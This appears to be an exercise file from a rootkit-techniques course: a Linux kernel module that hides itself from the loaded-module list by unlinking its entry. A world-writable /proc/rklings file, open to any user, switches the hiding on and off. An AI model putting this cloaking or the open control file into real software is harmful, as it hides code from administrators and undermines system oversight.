// SPDX-License-Identifier: GPL-2.0
#if RKLINGS_FAIL_POINT < 0 || RKLINGS_FAIL_POINT > 0
#error "unknown RKLINGS_FAIL_POINT"
#endif

#include <linux/init.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>

static struct list_head *saved_prev;
static bool cloaked;
static struct proc_dir_entry *control_entry;

static void rk_module_cloak(void)
{
	if (cloaked)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	cloaked = true;
}

static void rk_module_uncloak(void)
{
	if (!cloaked)
		return;
	list_add(&THIS_MODULE->list, saved_prev);
	cloaked = false;
}

static ssize_t rk_control_write(struct file *file, const char __user *buffer,
				size_t count, loff_t *offset)
{
	char command[16];
	size_t length;

	if (count >= sizeof(command))
		return -EINVAL;
	if (copy_from_user(command, buffer, count))
		return -EFAULT;
	command[count] = '\0';
	length = count;
	if (length > 0 && command[length - 1] == '\n')
		command[--length] = '\0';
	if (!strcmp(command, "hide"))
		rk_module_cloak();
	else if (!strcmp(command, "unhide"))
		rk_module_uncloak();
	else
		return -EINVAL;
	return count;
}

static int rk_status_show(struct seq_file *output, void *unused)
{
	seq_printf(output, "hidden=%s\n", cloaked ? "true" : "false");
	return 0;
}

static int rk_status_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_status_show, NULL);
}

static const struct proc_ops rk_control_ops = {
	.proc_open = rk_status_open,
	.proc_read = seq_read,
	.proc_write = rk_control_write,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

static int __init rk_init(void)
{
	control_entry = proc_create("rklings", 0666, NULL, &rk_control_ops);
	return control_entry ? 0 : -ENOMEM;
}

static void __exit rk_exit(void)
{
	rk_module_uncloak();
	proc_remove(control_entry);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exercise module");
